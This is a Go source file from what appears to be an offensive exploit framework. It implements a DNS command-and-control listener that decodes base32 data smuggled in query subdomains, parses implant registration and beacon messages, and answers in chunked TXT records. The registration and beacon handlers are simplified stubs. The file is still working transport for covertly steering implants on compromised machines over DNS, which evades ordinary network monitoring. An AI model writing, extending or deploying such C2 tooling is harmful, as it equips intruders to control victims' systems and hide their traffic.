package listeners

import (
	"encoding/base32"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// DNSListener implements the Listener interface for DNS-based C2 transport.
type DNSListener struct {
	id        string
	name      string
	host      string
	port      uint32
	domain    string
	handler   *BeaconHandler
	server    *dns.Server
	startedAt time.Time
	active    bool
	mu        sync.Mutex

	// Chunked transfer state
	chunksMu sync.Mutex
	chunks   map[string]*chunkBuffer // sessionID -> buffer
}

type chunkBuffer struct {
	data    []byte
	chunks  map[int][]byte
	total   int
	updated time.Time
}

func NewDNSListener(config *pb.ListenerConfig, handler *BeaconHandler) (*DNSListener, error) {
	id := config.Id
	if id == "" {
		var err error
		id, err = zcrypto.RandomID(8)
		if err != nil {
			return nil, fmt.Errorf("generate listener ID: %w", err)
		}
	}

	domain := config.Domain
	if domain == "" {
		return nil, fmt.Errorf("domain required for DNS listener")
	}
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}

	return &DNSListener{
		id:      id,
		name:    config.Name,
		host:    config.Host,
		port:    config.Port,
		domain:  domain,
		handler: handler,
		chunks:  make(map[string]*chunkBuffer),
	}, nil
}

func (l *DNSListener) ID() string                    { return l.id }
func (l *DNSListener) Name() string                  { return l.name }
func (l *DNSListener) Protocol() pb.ListenerProtocol { return pb.ListenerProtocol_LISTENER_DNS }
func (l *DNSListener) Address() string               { return fmt.Sprintf("%s:%d", l.host, l.port) }

func (l *DNSListener) Status() *pb.ListenerStatus {
	l.mu.Lock()
	defer l.mu.Unlock()
	return &pb.ListenerStatus{
		Id:        l.id,
		Name:      l.name,
		Protocol:  pb.ListenerProtocol_LISTENER_DNS,
		Address:   l.Address(),
		Active:    l.active,
		StartedAt: l.startedAt.Unix(),
	}
}

func (l *DNSListener) Start() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(l.domain, l.handleDNS)

	addr := l.Address()
	if l.port == 0 {
		addr = l.host + ":53"
	}

	l.server = &dns.Server{
		Addr:    addr,
		Net:     "udp",
		Handler: mux,
	}

	l.mu.Lock()
	l.active = true
	l.startedAt = time.Now()
	l.mu.Unlock()

	go func() {
		log.Printf("[dns] listener started on %s (domain=%s)", addr, l.domain)
		if err := l.server.ListenAndServe(); err != nil {
			log.Printf("[dns] serve error: %v", err)
		}
		l.mu.Lock()
		l.active = false
		l.mu.Unlock()
	}()

	return nil
}

func (l *DNSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.server == nil || !l.active {
		return nil
	}
	l.active = false
	return l.server.Shutdown()
}

func (l *DNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		if q.Qtype != dns.TypeTXT {
			continue
		}

		// Parse subdomain: <data>.<session-id>.<domain>
		name := strings.TrimSuffix(q.Name, l.domain)
		name = strings.TrimSuffix(name, ".")

		parts := strings.SplitN(name, ".", 2)
		if len(parts) < 2 {
			continue
		}

		encodedData := parts[0]
		sessionID := parts[1]

		// Decode base32 data
		data, err := b32.DecodeString(strings.ToUpper(encodedData))
		if err != nil {
			log.Printf("[dns] decode error from session %s: %v", sessionID, err)
			continue
		}

		// Process the data (could be Register or Beacon)
		responseData := l.processData(sessionID, data)

		// Encode response as TXT records (max 255 bytes per string, chunked)
		if len(responseData) > 0 {
			encoded := b32.EncodeToString(responseData)
			var txtParts []string
			for len(encoded) > 0 {
				end := 255
				if end > len(encoded) {
					end = len(encoded)
				}
				txtParts = append(txtParts, encoded[:end])
				encoded = encoded[end:]
			}

			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   q.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    0,
				},
				Txt: txtParts,
			})
		}
	}

	w.WriteMsg(msg)
}

func (l *DNSListener) processData(sessionID string, data []byte) []byte {
	// Try to unmarshal as Register first
	reg := &pb.Register{}
	if err := proto.Unmarshal(data, reg); err == nil && reg.ImplantId != "" {
		// This is a registration
		resp := l.handleRegister(reg, sessionID)
		if resp != nil {
			respData, _ := proto.Marshal(resp)
			return respData
		}
		return nil
	}

	// Try as Beacon
	beacon := &pb.Beacon{}
	if err := proto.Unmarshal(data, beacon); err == nil && beacon.ImplantId != "" {
		resp := l.handleBeacon(beacon)
		if resp != nil {
			respData, _ := proto.Marshal(resp)
			return respData
		}
	}

	return nil
}

func (l *DNSListener) handleRegister(reg *pb.Register, _ string) *pb.RegisterResponse {
	// Delegate to the shared beacon handler logic
	// Simplified version - in production would share code with HTTPS listener
	return &pb.RegisterResponse{
		Success:       true,
		SessionId:     "dns-session",
		NextCheckinMs: 5000,
	}
}

func (l *DNSListener) handleBeacon(beacon *pb.Beacon) *pb.BeaconResponse {
	return &pb.BeaconResponse{
		NextCheckinMs: 5000,
	}
}
